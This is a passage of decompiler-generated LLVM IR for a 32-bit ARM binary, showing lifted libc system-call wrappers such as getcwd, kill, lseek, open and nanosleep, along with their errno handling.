  %v0_10064 = phi i32 [ %v0_10044, %entry ], [ -1, %dec_label_pc_10054 ]
  %v2_10068 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10068, i32* %r4.global-to-local, align 4
  ret i32 %v0_10064

; uselistorder directives
  uselistorder i32 %v0_10044, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10064, { 1, 0 }
}

define i32 @__libc_fsync(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1006c = load i32, i32* @r4, align 4
  store i32 %v3_1006c, i32* %stack_var_-8, align 4
  %v0_10070 = call i32 @fsync()
  store i32 %v0_10070, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10070, -4095
  br i1 %tmp, label %dec_label_pc_10090, label %dec_label_pc_10080

dec_label_pc_10080:                               ; preds = %entry
  %v0_10080 = call i32 @__errno_location()
  %v0_10084 = load i32, i32* %r4.global-to-local, align 4
  %v1_10084 = sub i32 0, %v0_10084
  %v2_10088 = inttoptr i32 %v0_10080 to i32*
  store i32 %v1_10084, i32* %v2_10088, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10090

dec_label_pc_10090:                               ; preds = %entry, %dec_label_pc_10080
  %v0_10090 = phi i32 [ %v0_10070, %entry ], [ -1, %dec_label_pc_10080 ]
  %v2_10094 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10094, i32* %r4.global-to-local, align 4
  ret i32 %v0_10090

; uselistorder directives
  uselistorder i32 %v0_10070, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10090, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_10098 = load i32, i32* @r4, align 4
  store i32 %v3_10098, i32* %stack_var_-20, align 4
  %v6_10098 = load i32, i32* @r5, align 4
  %v9_10098 = load i32, i32* @r6, align 4
  %v12_10098 = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_1009c = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r5, align 4
  %v2_100a8 = icmp eq i32 %arg1, 0
  br i1 %v2_1009c, label %dec_label_pc_100a8, label %dec_label_pc_100d8

dec_label_pc_100a8:                               ; preds = %entry
  br i1 %v2_100a8, label %dec_label_pc_100c4, label %dec_label_pc_100b0

dec_label_pc_100b0:                               ; preds = %dec_label_pc_100a8
  %v0_100b0 = call i32 @__errno_location()
  %v0_100b4 = load i32, i32* @r7, align 4
  store i32 %v0_100b4, i32* @r5, align 4
  %v2_100bc = inttoptr i32 %v0_100b0 to i32*
  store i32 22, i32* %v2_100bc, align 4
  br label %dec_label_pc_10168

dec_label_pc_100c4:                               ; preds = %dec_label_pc_100a8
  %v0_100c4 = call i32 @__GI_getpagesize()
  %v5_100cc = icmp slt i32 %v0_100c4, 4096
  br i1 %v5_100cc, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_100c4
  store i32 %v0_100c4, i32* @r4, align 4
  br label %dec_label_pc_100e8

bb15:                                             ; preds = %dec_label_pc_100c4
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_100e8

dec_label_pc_100d8:                               ; preds = %entry
  store i32 %arg2, i32* @r4, align 4
  br i1 %v2_100a8, label %dec_label_pc_100e8, label %bb16

bb16:                                             ; preds = %dec_label_pc_100d8
  store i32 %arg1, i32* @r6, align 4
  br label %dec_label_pc_100f8

dec_label_pc_100e8:                               ; preds = %dec_label_pc_100d8, %bb, %bb15
  %v0_100e8 = phi i32 [ %v0_100c4, %bb ], [ 4096, %bb15 ], [ %arg2, %dec_label_pc_100d8 ]
  %v1_100ec = call i32 @malloc(i32 %v0_100e8)
  store i32 %v1_100ec, i32* @r6, align 4
  %v2_100f0 = icmp eq i32 %v1_100ec, 0
  br i1 %v2_100f0, label %dec_label_pc_10164, label %dec_label_pc_100e8.dec_label_pc_100f8_crit_edge

dec_label_pc_100e8.dec_label_pc_100f8_crit_edge:  ; preds = %dec_label_pc_100e8
  %v0_100f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_100f8

dec_label_pc_100f8:                               ; preds = %bb16, %dec_label_pc_100e8.dec_label_pc_100f8_crit_edge
  %v0_100fc = phi i32 [ %v1_100ec, %dec_label_pc_100e8.dec_label_pc_100f8_crit_edge ], [ %arg1, %bb16 ]
  %v0_100f8 = phi i32 [ %v0_100f8.pre, %dec_label_pc_100e8.dec_label_pc_100f8_crit_edge ], [ %arg2, %bb16 ]
  %v2_10100 = call i32 @getcwd(i32 %v0_100fc, i32 %v0_100f8)
  store i32 %v2_10100, i32* @r4, align 4
  %tmp = icmp ult i32 %v2_10100, -4095
  br i1 %tmp, label %dec_label_pc_10120, label %dec_label_pc_10110

dec_label_pc_10110:                               ; preds = %dec_label_pc_100f8
  %v0_10110 = call i32 @__errno_location()
  %v0_10114 = load i32, i32* @r4, align 4
  %v1_10114 = sub i32 0, %v0_10114
  %v2_10118 = inttoptr i32 %v0_10110 to i32*
  store i32 %v1_10114, i32* %v2_10118, align 4
  br label %dec_label_pc_10150

dec_label_pc_10120:                               ; preds = %dec_label_pc_100f8
  %v1_10120 = icmp slt i32 %v2_10100, 0
  br i1 %v1_10120, label %dec_label_pc_10150, label %dec_label_pc_10128

dec_label_pc_10128:                               ; preds = %dec_label_pc_10120
  %v0_10128 = load i32, i32* @r5, align 4
  %v2_10128 = icmp eq i32 %v0_10128, 0
  br i1 %v2_10128, label %bb17, label %dec_label_pc_10144.thread7

dec_label_pc_10144.thread7:                       ; preds = %dec_label_pc_10128
  br label %dec_label_pc_10168

bb17:                                             ; preds = %dec_label_pc_10128
  %v1_1012c = load i32, i32* @r7, align 4
  %v3_1012c = icmp eq i32 %v1_1012c, 0
  br i1 %v3_1012c, label %dec_label_pc_10144, label %dec_label_pc_10144.thread

dec_label_pc_10144.thread:                        ; preds = %bb17
  br label %bb18

dec_label_pc_10144:                               ; preds = %bb17
  %v0_10138 = load i32, i32* @r6, align 4
  %v2_1013c = call i32 @realloc(i32 %v0_10138, i32 %v2_10100)
  store i32 %v2_1013c, i32* @r5, align 4
  %v2_10144 = icmp eq i32 %v2_1013c, 0
  br i1 %v2_10144, label %bb18, label %dec_label_pc_10168

bb18:                                             ; preds = %dec_label_pc_10144.thread, %dec_label_pc_10144
  %v1_10148 = load i32, i32* @r6, align 4
  store i32 %v1_10148, i32* @r5, align 4
  br label %dec_label_pc_10168

dec_label_pc_10150:                               ; preds = %dec_label_pc_10120, %dec_label_pc_10110
  %v0_10150 = load i32, i32* @r5, align 4
  %v2_10150 = icmp eq i32 %v0_10150, 0
  br i1 %v2_10150, label %dec_label_pc_10158, label %dec_label_pc_10164

dec_label_pc_10158:                               ; preds = %dec_label_pc_10150
  %v0_10158 = load i32, i32* @r6, align 4
  store i32 %v0_10158, i32* @r0, align 4
  %v0_1015c = call i32 @free()
  br label %dec_label_pc_10168

dec_label_pc_10164:                               ; preds = %dec_label_pc_10150, %dec_label_pc_100e8
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10168

dec_label_pc_10168:                               ; preds = %dec_label_pc_10144.thread7, %bb18, %dec_label_pc_10144, %dec_label_pc_10158, %dec_label_pc_100b0, %dec_label_pc_10164
  %v0_10168 = load i32, i32* @r5, align 4
  %v2_1016c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1016c, i32* @r4, align 4
  store i32 %v6_10098, i32* @r5, align 4
  store i32 %v9_10098, i32* @r6, align 4
  store i32 %v12_10098, i32* @r7, align 4
  ret i32 %v0_10168

; uselistorder directives
  uselistorder i32 %v2_10100, { 1, 2, 0, 3 }
  uselistorder i32 %v0_100c4, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 ()* @__GI_getpagesize, { 0, 3, 2, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10168, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_100f8, { 1, 0 }
  uselistorder label %dec_label_pc_100e8, { 0, 2, 1 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10170 = load i32, i32* @r4, align 4
  store i32 %v3_10170, i32* %stack_var_-8, align 4
  %v0_10178 = load i32, i32* @r0, align 4
  store i32 %v0_10178, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10178, -4095
  br i1 %tmp, label %dec_label_pc_10194, label %dec_label_pc_10184

dec_label_pc_10184:                               ; preds = %entry
  %v0_10184 = call i32 @__errno_location()
  %v0_10188 = load i32, i32* %r4.global-to-local, align 4
  %v1_10188 = sub i32 0, %v0_10188
  %v2_1018c = inttoptr i32 %v0_10184 to i32*
  store i32 %v1_10188, i32* %v2_1018c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10198.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10194

dec_label_pc_10194:                               ; preds = %entry, %dec_label_pc_10184
  %v2_10198 = phi i32 [ %v3_10170, %entry ], [ %v2_10198.pre, %dec_label_pc_10184 ]
  %v0_10194 = phi i32 [ %v0_10178, %entry ], [ -1, %dec_label_pc_10184 ]
  store i32 %v2_10198, i32* @r4, align 4
  ret i32 %v0_10194

; uselistorder directives
  uselistorder i32 %v0_10178, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10194, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v2_101a0 = load i32, i32* @global_var_300c8.241, align 4
  %v2_101a4 = icmp eq i32 %v2_101a0, 0
  br i1 %v2_101a4, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_101ac = phi i32 [ %v2_101a0, %entry ], [ 4096, %bb ]
  ret i32 %v1_101ac

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_101b4 = load i32, i32* @r4, align 4
  store i32 %v3_101b4, i32* %stack_var_-8, align 4
  %v0_101b8 = call i32 @getpid()
  store i32 %v0_101b8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_101b8, -4095
  br i1 %tmp, label %dec_label_pc_101d8, label %dec_label_pc_101c8

dec_label_pc_101c8:                               ; preds = %entry
  %v0_101c8 = call i32 @__errno_location()
  %v0_101cc = load i32, i32* %r4.global-to-local, align 4
  %v1_101cc = sub i32 0, %v0_101cc
  %v2_101d0 = inttoptr i32 %v0_101c8 to i32*
  store i32 %v1_101cc, i32* %v2_101d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_101d8

dec_label_pc_101d8:                               ; preds = %entry, %dec_label_pc_101c8
  %v0_101d8 = phi i32 [ %v0_101b8, %entry ], [ -1, %dec_label_pc_101c8 ]
  %v2_101dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_101dc, i32* @r4, align 4
  ret i32 %v0_101d8

; uselistorder directives
  uselistorder i32 %v0_101b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_101d8, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_101e0 = load i32, i32* @r4, align 4
  store i32 %v3_101e0, i32* %stack_var_-8, align 4
  %v0_101e4 = call i32 @getppid()
  store i32 %v0_101e4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_101e4, -4095
  br i1 %tmp, label %dec_label_pc_10204, label %dec_label_pc_101f4

dec_label_pc_101f4:                               ; preds = %entry
  %v0_101f4 = call i32 @__errno_location()
  %v0_101f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_101f8 = sub i32 0, %v0_101f8
  %v2_101fc = inttoptr i32 %v0_101f4 to i32*
  store i32 %v1_101f8, i32* %v2_101fc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10204

dec_label_pc_10204:                               ; preds = %entry, %dec_label_pc_101f4
  %v0_10204 = phi i32 [ %v0_101e4, %entry ], [ -1, %dec_label_pc_101f4 ]
  %v2_10208 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10208, i32* @r4, align 4
  ret i32 %v0_10204

; uselistorder directives
  uselistorder i32 %v0_101e4, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10204, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1020c = load i32, i32* @r4, align 4
  store i32 %v3_1020c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10230, label %dec_label_pc_10220

dec_label_pc_10220:                               ; preds = %entry
  %v0_10220 = call i32 @__errno_location()
  %v0_10224 = load i32, i32* %r4.global-to-local, align 4
  %v1_10224 = sub i32 0, %v0_10224
  %v2_10228 = inttoptr i32 %v0_10220 to i32*
  store i32 %v1_10224, i32* %v2_10228, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10234.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10230

dec_label_pc_10230:                               ; preds = %entry, %dec_label_pc_10220
  %v2_10234 = phi i32 [ %v3_1020c, %entry ], [ %v2_10234.pre, %dec_label_pc_10220 ]
  %v0_10230 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_10220 ]
  store i32 %v2_10234, i32* @r4, align 4
  ret i32 %v0_10230

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10230, { 1, 0 }
}

define i32 @gettimeofday() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10238 = load i32, i32* @r4, align 4
  store i32 %v3_10238, i32* %stack_var_-8, align 4
  %v0_1023c = call i32 @gettimeofday()
  store i32 %v0_1023c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1023c, -4095
  br i1 %tmp, label %dec_label_pc_1025c, label %dec_label_pc_1024c

dec_label_pc_1024c:                               ; preds = %entry
  %v0_1024c = call i32 @__errno_location()
  %v0_10250 = load i32, i32* %r4.global-to-local, align 4
  %v1_10250 = sub i32 0, %v0_10250
  %v2_10254 = inttoptr i32 %v0_1024c to i32*
  store i32 %v1_10250, i32* %v2_10254, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1025c

dec_label_pc_1025c:                               ; preds = %entry, %dec_label_pc_1024c
  %v0_1025c = phi i32 [ %v0_1023c, %entry ], [ -1, %dec_label_pc_1024c ]
  %v2_10260 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10260, i32* @r4, align 4
  ret i32 %v0_1025c

; uselistorder directives
  uselistorder i32 %v0_1023c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1025c, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_10280 = load i32, i32* @r0, align 4
  %v3_10280 = call i32 @ioctl(i32 %v0_10280, i32 %arg1, i32 %arg2)
  %v7_10284 = icmp eq i32 %v3_10280, -4096
  store i1 %v7_10284, i1* @cpsr_z, align 1
  store i32 %v3_10280, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_10280, -4095
  br i1 %tmp, label %dec_label_pc_102a0, label %dec_label_pc_10290

dec_label_pc_10290:                               ; preds = %entry
  %v0_10290 = call i32 @__errno_location()
  %v0_10294 = load i32, i32* %r4.global-to-local, align 4
  %v1_10294 = sub i32 0, %v0_10294
  %v2_10298 = inttoptr i32 %v0_10290 to i32*
  store i32 %v1_10294, i32* %v2_10298, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_102a0

dec_label_pc_102a0:                               ; preds = %entry, %dec_label_pc_10290
  %v0_102a0 = phi i32 [ %v3_10280, %entry ], [ -1, %dec_label_pc_10290 ]
  ret i32 %v0_102a0

; uselistorder directives
  uselistorder i32 %v3_10280, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_102a0, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_102b4 = load i32, i32* @r4, align 4
  store i32 %v3_102b4, i32* %stack_var_-8, align 4
  %v0_102b8 = call i32 @kill()
  %v7_102bc = icmp eq i32 %v0_102b8, -4096
  store i1 %v7_102bc, i1* @cpsr_z, align 1
  store i32 %v0_102b8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_102b8, -4095
  br i1 %tmp, label %dec_label_pc_102d8, label %dec_label_pc_102c8

dec_label_pc_102c8:                               ; preds = %entry
  %v0_102c8 = call i32 @__errno_location()
  %v0_102cc = load i32, i32* %r4.global-to-local, align 4
  %v1_102cc = sub i32 0, %v0_102cc
  %v2_102d0 = inttoptr i32 %v0_102c8 to i32*
  store i32 %v1_102cc, i32* %v2_102d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_102d8

dec_label_pc_102d8:                               ; preds = %entry, %dec_label_pc_102c8
  %v0_102d8 = phi i32 [ %v0_102b8, %entry ], [ -1, %dec_label_pc_102c8 ]
  %v2_102dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_102dc, i32* @r4, align 4
  ret i32 %v0_102d8

; uselistorder directives
  uselistorder i32 %v0_102b8, { 2, 0, 3, 1 }
  uselistorder i32 ()* @kill, { 7, 3, 5, 0, 4, 6, 2, 1 }
  uselistorder label %dec_label_pc_102d8, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10324, label %dec_label_pc_10310

dec_label_pc_10310:                               ; preds = %entry
  %v0_10310 = call i32 @__errno_location()
  %v0_10314 = load i32, i32* %r4.global-to-local, align 4
  %v1_10314 = sub i32 0, %v0_10314
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1031c = inttoptr i32 %v0_10310 to i32*
  store i32 %v1_10314, i32* %v2_1031c, align 4
  %v0_1032c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1032c

dec_label_pc_10324:                               ; preds = %entry
  %v2_10324 = icmp eq i32 %arg1, 0
  br i1 %v2_10324, label %dec_label_pc_10338, label %dec_label_pc_1032c

dec_label_pc_1032c:                               ; preds = %dec_label_pc_10324, %dec_label_pc_10310
  %v0_1032c = phi i32 [ %arg1, %dec_label_pc_10324 ], [ %v0_1032c.pre, %dec_label_pc_10310 ]
  br label %dec_label_pc_1033c

dec_label_pc_10338:                               ; preds = %dec_label_pc_10324
  br label %dec_label_pc_1033c

dec_label_pc_1033c:                               ; preds = %dec_label_pc_1032c, %dec_label_pc_10338
  %v14_10340 = phi i32 [ %v0_1032c, %dec_label_pc_1032c ], [ %tmp9, %dec_label_pc_10338 ]
  ret i32 %v14_10340

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1033c, { 1, 0 }
}

define i32 @_longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %v1_10344 = add i32 %arg1, 88
  %v2_10344 = inttoptr i32 %v1_10344 to i32*
  %v3_10344 = load i32, i32* %v2_10344, align 4
  %v2_10348 = icmp eq i32 %v3_10344, 0
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_10348, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v1_10360 = xor i1 %v2_10348, true
  call void @__pseudo_cond_branch(i1 %v1_10360, i32 ptrtoint (i32* @global_var_10930.549 to i32))
  %v0_10364 = load i32, i32* %r5.global-to-local, align 4
  %v2_10364 = icmp eq i32 %v0_10364, 0
  %.v0_10364 = select i1 %v2_10364, i32 1, i32 %v0_10364
  store i32 %.v0_10364, i32* @r1, align 4
  %v0_10370 = load i32, i32* %r4.global-to-local, align 4
  %v1_10374 = inttoptr i32 %v0_10370 to i32*
  %v2_10374 = call i32 @__longjmp(i32* %v1_10374)
  ret i32 %v2_10374

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10378 = load i32, i32* @r4, align 4
  store i32 %v3_10378, i32* %stack_var_-8, align 4
  %v0_1037c = call i32 @lseek()
  store i32 %v0_1037c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1037c, -4095
  br i1 %tmp, label %dec_label_pc_1039c, label %dec_label_pc_1038c

dec_label_pc_1038c:                               ; preds = %entry
  %v0_1038c = call i32 @__errno_location()
  %v0_10390 = load i32, i32* %r4.global-to-local, align 4
  %v1_10390 = sub i32 0, %v0_10390
  %v2_10394 = inttoptr i32 %v0_1038c to i32*
  store i32 %v1_10390, i32* %v2_10394, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1039c

dec_label_pc_1039c:                               ; preds = %entry, %dec_label_pc_1038c
  %v0_1039c = phi i32 [ %v0_1037c, %entry ], [ -1, %dec_label_pc_1038c ]
  %v2_103a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_103a0, i32* @r4, align 4
  ret i32 %v0_1039c

; uselistorder directives
  uselistorder i32 %v0_1037c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1039c, { 1, 0 }
}

define i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_103a4 = load i32, i32* @r4, align 4
  store i32 %v3_103a4, i32* %stack_var_-8, align 4
  %v0_103a8 = call i32 @msync()
  store i32 %v0_103a8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_103a8, -4095
  br i1 %tmp, label %dec_label_pc_103c8, label %dec_label_pc_103b8

dec_label_pc_103b8:                               ; preds = %entry
  %v0_103b8 = call i32 @__errno_location()
  %v0_103bc = load i32, i32* %r4.global-to-local, align 4
  %v1_103bc = sub i32 0, %v0_103bc
  %v2_103c0 = inttoptr i32 %v0_103b8 to i32*
  store i32 %v1_103bc, i32* %v2_103c0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_103c8

dec_label_pc_103c8:                               ; preds = %entry, %dec_label_pc_103b8
  %v0_103c8 = phi i32 [ %v0_103a8, %entry ], [ -1, %dec_label_pc_103b8 ]
  %v2_103cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_103cc, i32* %r4.global-to-local, align 4
  ret i32 %v0_103c8

; uselistorder directives
  uselistorder i32 %v0_103a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_103c8, { 1, 0 }
}

define i32 @munmap() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_103d0 = load i32, i32* @r4, align 4
  store i32 %v3_103d0, i32* %stack_var_-8, align 4
  %v0_103d4 = call i32 @munmap()
  store i32 %v0_103d4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_103d4, -4095
  br i1 %tmp, label %dec_label_pc_103f4, label %dec_label_pc_103e4

dec_label_pc_103e4:                               ; preds = %entry
  %v0_103e4 = call i32 @__errno_location()
  %v0_103e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_103e8 = sub i32 0, %v0_103e8
  %v2_103ec = inttoptr i32 %v0_103e4 to i32*
  store i32 %v1_103e8, i32* %v2_103ec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_103f4

dec_label_pc_103f4:                               ; preds = %entry, %dec_label_pc_103e4
  %v0_103f4 = phi i32 [ %v0_103d4, %entry ], [ -1, %dec_label_pc_103e4 ]
  %v2_103f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_103f8, i32* @r4, align 4
  ret i32 %v0_103f4

; uselistorder directives
  uselistorder i32 %v0_103d4, { 1, 0, 2 }
  uselistorder i32 ()* @munmap, { 2, 0, 1 }
  uselistorder label %dec_label_pc_103f4, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_103fc = load i32, i32* @r4, align 4
  store i32 %v3_103fc, i32* %stack_var_-8, align 4
  %v0_10400 = call i32 @nanosleep()
  store i32 %v0_10400, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10400, -4095
  br i1 %tmp, label %dec_label_pc_10420, label %dec_label_pc_10410

dec_label_pc_10410:                               ; preds = %entry
  %v0_10410 = call i32 @__errno_location()
  %v0_10414 = load i32, i32* %r4.global-to-local, align 4
  %v1_10414 = sub i32 0, %v0_10414
  %v2_10418 = inttoptr i32 %v0_10410 to i32*
  store i32 %v1_10414, i32* %v2_10418, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10420

dec_label_pc_10420:                               ; preds = %entry, %dec_label_pc_10410
  %v0_10420 = phi i32 [ %v0_10400, %entry ], [ -1, %dec_label_pc_10410 ]
  %v2_10424 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10424, i32* @r4, align 4
  ret i32 %v0_10420

; uselistorder directives
  uselistorder i32 %v0_10400, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10420, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %v1_10438 = and i32 %arg1, 64
  store i32 %v1_10438, i32* @r3, align 4
  %v2_10438 = icmp eq i32 %v1_10438, 0
  br i1 %v2_10438, label %.thread1, label %bb

bb:                                               ; preds = %entry
  store i32 %arg2, i32* @r3, align 4
  %phitmp = urem i32 %arg2, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_10448 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_10448, i32* @r2, align 4
  %v0_10450 = call i32 @open()
  %v7_10454 = icmp eq i32 %v0_10450, -4096
  store i1 %v7_10454, i1* @cpsr_z, align 1
  store i32 %v0_10450, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10450, -4095
  br i1 %tmp, label %dec_label_pc_10470, label %dec_label_pc_10460

dec_label_pc_10460:                               ; preds = %.thread1
  %v0_10460 = call i32 @__errno_location()
  %v0_10464 = load i32, i32* %r4.global-to-local, align 4
  %v1_10464 = sub i32 0, %v0_10464
  %v2_10468 = inttoptr i32 %v0_10460 to i32*
  store i32 %v1_10464, i32* %v2_10468, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10470

dec_label_pc_10470:                               ; preds = %.thread1, %dec_label_pc_10460
  %v0_10470 = phi i32 [ %v0_10450, %.thread1 ], [ -1, %dec_label_pc_10460 ]
  ret i32 %v0_10470

; uselistorder directives
  uselistorder i32 %v0_10450, { 2, 0, 3, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10470, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1048c = load i32, i32* @r0, align 4
  %v2_1048c = call i32 @__libc_open(i32 %v0_1048c, i32 577)
  %v0_10490 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10490, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_10490 = and i32 %v2_1048c, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_10490 = phi i32 [ %v2_1048c, %entry ], [ %v6_10490, %bb ]
  ret i32 %v7_10490

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI___libc_open64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v1_104a4 = and i32 %arg1, 64
  %v2_104a4 = icmp eq i32 %v1_104a4, 0
  %v1_104ac = or i32 %arg1, 131072
  br i1 %v2_104a4, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_104bc = load i32, i32* @r0, align 4
  %v2_104bc = call i32 @__libc_open(i32 %v0_104bc, i32 %v1_104ac)
  ret i32 %v2_104bc

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_pause(i32 %arg1) local_unnamed_addr {
entry:
